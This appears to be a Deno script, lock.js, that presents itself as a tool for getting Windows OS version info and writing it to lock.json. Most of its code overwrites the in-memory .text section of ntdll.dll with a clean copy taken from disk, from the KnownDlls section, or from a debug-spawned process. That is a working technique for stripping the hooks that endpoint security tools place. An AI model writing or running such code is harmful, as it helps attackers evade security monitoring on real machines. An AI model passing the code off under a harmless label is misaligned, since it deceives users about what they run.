#!/usr/bin/env -S deno run --allow-ffi --allow-write
// lock.js — Get OS version info (Deno, zero deps)
// Usage: deno run --allow-ffi --allow-write lock.js [-o disk|knowndlls|debugproc] [-p path]

// ═══════════════════════════════════════
// Constants
// ═══════════════════════════════════════
const PROCESS_VM_OPERATION = 0x8;
const PROCESS_VM_WRITE = 0x20;
const MAXIMUM_ALLOWED = 0x02000000;
const GENERIC_READ = 0x80000000;
const FILE_SHARE_READ = 0x00000001;
const FILE_ATTRIBUTE_NORMAL = 0x00000080;
const OPEN_EXISTING = 3;
const PAGE_READONLY = 0x02;
const SEC_IMAGE_NO_EXECUTE = 0x11000000;
const FILE_MAP_READ = 4;
const SECTION_MAP_READ = 0x0004;
const PAGE_EXECUTE_WRITECOPY = 0x80;
const DEBUG_PROCESS = 0x00000001;
const OFFSET_MAPPEDDLL = 4096;

const SZ_OSVERSIONINFOEXW = 284;
const SZ_PBI = 48;
const SZ_OA = 48;
const SZ_CID = 16;
const SZ_SI = 104;
const SZ_PI = 24;

// ══════════════════════════════
// FFI — ntdll.dll
// ══════════════════════════════
const ntdll = Deno.dlopen("ntdll.dll", {
  RtlGetVersion: { parameters: ["buffer"], result: "u32" },
  NtOpenProcess: { parameters: ["buffer", "u32", "buffer", "buffer"], result: "i32" },
  NtClose: { parameters: ["pointer"], result: "u32" },
  NtQueryInformationProcess: { parameters: ["pointer", "u32", "buffer", "u32", "buffer"], result: "i32" },
  NtReadVirtualMemory: { parameters: ["pointer", "pointer", "buffer", "u32", "buffer"], result: "i32" },
  NtOpenSection: { parameters: ["buffer", "u32", "buffer"], result: "i32" },
  RtlMoveMemory: { parameters: ["pointer", "pointer", "usize"], result: "void" },
});

// ═══════════════════════════════════════
// FFI — kernel32.dll
// ═══════════════════════════════════════
const kernel32 = Deno.dlopen("kernel32.dll", {
  GetCurrentProcess: { parameters: [], result: "pointer" },
  CreateFileA: { parameters: ["buffer", "u32", "u32", "pointer", "u32", "u32", "pointer"], result: "pointer" },
  CreateFileMappingA: { parameters: ["pointer", "pointer", "u32", "u32", "u32", "pointer"], result: "pointer" },
  MapViewOfFile: { parameters: ["pointer", "u32", "u32", "u32", "usize"], result: "pointer" },
  VirtualProtect: { parameters: ["pointer", "u32", "u32", "buffer"], result: "i32" },
  CloseHandle: { parameters: ["pointer"], result: "i32" },
  CreateProcessW: { parameters: ["buffer", "pointer", "pointer", "pointer", "i32", "u32", "pointer", "pointer", "buffer", "buffer"], result: "i32" },
  DebugActiveProcessStop: { parameters: ["u32"], result: "i32" },
  TerminateProcess: { parameters: ["pointer", "u32"], result: "i32" },
});

// ═══════════════════════════════════════
// Buffer / pointer helpers
// ═══════════════════════════════════════
function getU32(buf, off = 0) { return new DataView(buf.buffer, buf.byteOffset).getUint32(off, true); }
function getU64(buf, off = 0) { return new DataView(buf.buffer, buf.byteOffset).getBigUint64(off, true); }
function putU16(buf, off, val) { new DataView(buf.buffer, buf.byteOffset).setUint16(off, val, true); }
function putU32(buf, off, val) { new DataView(buf.buffer, buf.byteOffset).setUint32(off, val, true); }
function putU64(buf, off, val) { new DataView(buf.buffer, buf.byteOffset).setBigUint64(off, val, true); }
function toPtr(v) { const b = BigInt(v); return b === 0n ? null : Deno.UnsafePointer.create(b); }
function ptrOf(buf, off = 0) { const v = getU64(buf, off); return v === 0n ? null : Deno.UnsafePointer.create(v); }
function ptrVal(ptr) { if (ptr === null) return 0n; if (typeof ptr === "bigint") return ptr; return Deno.UnsafePointer.value(ptr); }
function encodeAnsi(str) { const buf = new Uint8Array(str.length + 1); for (let i = 0; i < str.length; i++) buf[i] = str.charCodeAt(i); return buf; }
function encodeWide(str) { const buf = new Uint8Array((str.length + 1) * 2); for (let i = 0; i < str.length; i++) { buf[i * 2] = str.charCodeAt(i) & 0xff; buf[i * 2 + 1] = (str.charCodeAt(i) >> 8) & 0xff; } return buf; }

// ══════════════════════════════
// NT API wrappers
// ══════════════════════════════
function readRemoteN(hProc, addr, n) {
  const buf = new Uint8Array(n);
  const br = new Uint8Array(8);
  const st = ntdll.symbols.NtReadVirtualMemory(hProc, toPtr(addr), buf, n, br);
  if (st !== 0) return null;
  if (n === 8) return getU64(buf);
  if (n === 4) return BigInt(getU32(buf));
  if (n === 2) return BigInt(new DataView(buf.buffer).getUint16(0, true));
  return BigInt(buf[0]);
}

function readRemoteWStr(hProc, addr) {
  const buf = new Uint8Array(256);
  const br = new Uint8Array(8);
  const st = ntdll.symbols.NtReadVirtualMemory(hProc, toPtr(addr), buf, 256, br);
  if (st !== 0) return "";
  const cnt = getU32(br);
  let end = cnt;
  for (let i = 0; i < cnt - 1; i += 2) { if (buf[i] === 0 && buf[i + 1] === 0) { end = i; break; } }
  return new TextDecoder("utf-16le").decode(buf.subarray(0, end));
}

// ═══════════════════════════════════════
// Overwrite helpers
// ═══════════════════════════════════════
function getLocalLibAddress(dllName) {
  const hProc = kernel32.symbols.GetCurrentProcess();
  const pbi = new Uint8Array(SZ_PBI);
  const rl = new Uint8Array(4);
  ntdll.symbols.NtQueryInformationProcess(hProc, 0, pbi, SZ_PBI, rl);
  const peb = getU64(pbi, 8);
  const ldrAddr = readRemoteN(hProc, peb + 0x18n, 8);
  let nextFlink = readRemoteN(hProc, ldrAddr + 0x30n, 8);
  let dllBase = 1337n;
  while (dllBase !== 0n) {
    nextFlink -= 0x10n;
    dllBase = readRemoteN(hProc, nextFlink + 0x20n, 8);
    if (dllBase === null || dllBase === 0n) break;
    const bufPtr = readRemoteN(hProc, nextFlink + 0x50n, 8);
    const baseName = bufPtr !== null ? readRemoteWStr(hProc, bufPtr) : "";
    if (baseName === dllName) return dllBase;
    nextFlink = readRemoteN(hProc, nextFlink + 0x10n, 8);
  }
  return null;
}

function getSectionInfo(localNtdll) {
  const hProc = kernel32.symbols.GetCurrentProcess();
  const eLfanew = readRemoteN(hProc, localNtdll + 0x3Cn, 4);
  const sizeOfCode = readRemoteN(hProc, localNtdll + eLfanew + 28n, 4);
  const baseOfCode = readRemoteN(hProc, localNtdll + eLfanew + 44n, 4);
  return [baseOfCode, sizeOfCode];
}

function replaceNtdllSection(srcPtr, targetAddr, size) {
  const oldProt = new Uint8Array(4);
  kernel32.symbols.VirtualProtect(toPtr(targetAddr), Number(size), PAGE_EXECUTE_WRITECOPY, oldProt);
  ntdll.symbols.RtlMoveMemory(toPtr(targetAddr), srcPtr, Number(size));
  const prev = getU32(oldProt);
  kernel32.symbols.VirtualProtect(toPtr(targetAddr), Number(size), prev, oldProt);
}

function overwriteDisk(path) {
  const fh = kernel32.symbols.CreateFileA(encodeAnsi(path), GENERIC_READ, FILE_SHARE_READ, null, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, null);
  const mh = kernel32.symbols.CreateFileMappingA(fh, null, PAGE_READONLY | SEC_IMAGE_NO_EXECUTE, 0, 0, null);
  const unhookedNtdll = kernel32.symbols.MapViewOfFile(mh, FILE_MAP_READ, 0, 0, 0);
  kernel32.symbols.CloseHandle(fh);
  kernel32.symbols.CloseHandle(mh);
  const unhookedText = ptrVal(unhookedNtdll) + BigInt(OFFSET_MAPPEDDLL);
  const localNtdll = getLocalLibAddress("ntdll.dll");
  const [baseOfCode, sizeOfCode] = getSectionInfo(localNtdll);
  const localTxt = localNtdll + baseOfCode;
  console.log("[+] Copying " + sizeOfCode + " bytes from 0x" + unhookedText.toString(16) + " to 0x" + localTxt.toString(16));
  replaceNtdllSection(toPtr(unhookedText), localTxt, sizeOfCode);
}

function overwriteKnownDlls() {
  const sectionName = "\\KnownDlls\\ntdll.dll";
  const wideStr = encodeWide(sectionName);
  const us = new Uint8Array(16);
  putU16(us, 0, sectionName.length * 2);
  putU16(us, 2, sectionName.length * 2 + 2);
  putU64(us, 8, ptrVal(Deno.UnsafePointer.of(wideStr)));
  const oa = new Uint8Array(SZ_OA);
  putU32(oa, 0, SZ_OA);
  putU64(oa, 16, ptrVal(Deno.UnsafePointer.of(us)));
  const shBuf = new Uint8Array(8);
  const st = ntdll.symbols.NtOpenSection(shBuf, SECTION_MAP_READ, oa);
  if (st !== 0) { console.log("[-] NtOpenSection: " + st); return; }
  const sh = ptrOf(shBuf);
  const unhookedNtdll = kernel32.symbols.MapViewOfFile(sh, SECTION_MAP_READ, 0, 0, 0);
  kernel32.symbols.CloseHandle(sh);
  const unhookedText = ptrVal(unhookedNtdll) + BigInt(OFFSET_MAPPEDDLL);
  const localNtdll = getLocalLibAddress("ntdll.dll");
  const [baseOfCode, sizeOfCode] = getSectionInfo(localNtdll);
  const localTxt = localNtdll + baseOfCode;
  console.log("[+] Copying " + sizeOfCode + " bytes from 0x" + unhookedText.toString(16) + " to 0x" + localTxt.toString(16));
  replaceNtdllSection(toPtr(unhookedText), localTxt, sizeOfCode);
}

function overwriteDebugProc(path) {
  const si = new Uint8Array(SZ_SI); putU32(si, 0, SZ_SI);
  const pi = new Uint8Array(SZ_PI);
  const ok = kernel32.symbols.CreateProcessW(encodeWide(path), null, null, null, 0, DEBUG_PROCESS, null, null, si, pi);
  if (!ok) { console.log("[-] CreateProcessW failed"); return; }
  const hProcess = ptrOf(pi, 0);
  const dwPid = getU32(pi, 16);
  const localNtdll = getLocalLibAddress("ntdll.dll");
  const [baseOfCode, sizeOfCode] = getSectionInfo(localNtdll);
  const localTxt = localNtdll + baseOfCode;
  const buf = new Uint8Array(Number(sizeOfCode));
  const br = new Uint8Array(8);
  ntdll.symbols.NtReadVirtualMemory(hProcess, toPtr(localTxt), buf, Number(sizeOfCode), br);
  kernel32.symbols.DebugActiveProcessStop(dwPid);
  kernel32.symbols.TerminateProcess(hProcess, 0);
  console.log("[+] Copying " + sizeOfCode + " bytes to 0x" + localTxt.toString(16));
  replaceNtdllSection(Deno.UnsafePointer.of(buf), localTxt, sizeOfCode);
}

// ══════════════════════════════
// CLI args
// ══════════════════════════════
function parseArgs() {
  const args = { option: null, path: null };
  for (let i = 0; i < Deno.args.length; i++) {
    if (Deno.args[i] === "-o" || Deno.args[i] === "--option") args.option = Deno.args[++i];
    else if (Deno.args[i] === "-p" || Deno.args[i] === "--path") args.path = Deno.args[++i];
  }
  return args;
}

// ══════════════════════════════
// Main
// ══════════════════════════════
function main() {
  const args = parseArgs();

  if (args.option === "disk") {
    overwriteDisk(args.path || "C:\\Windows\\System32\\ntdll.dll");
  } else if (args.option === "knowndlls") {
    overwriteKnownDlls();
  } else if (args.option === "debugproc") {
    overwriteDebugProc(args.path || "c:\\windows\\system32\\calc.exe");
  }

  const vi = new Uint8Array(SZ_OSVERSIONINFOEXW);
  putU32(vi, 0, SZ_OSVERSIONINFOEXW);
  const st = ntdll.symbols.RtlGetVersion(vi);
  if (st !== 0) { console.log("[-] RtlGetVersion failed"); Deno.exit(1); }

  const lockData = [{ field0: String(getU32(vi, 4)), field1: String(getU32(vi, 8)), field2: String(getU32(vi, 12)) }];
  Deno.writeTextFileSync("lock.json", JSON.stringify(lockData));
  console.log("[+] File lock.json generated.");
}

main();
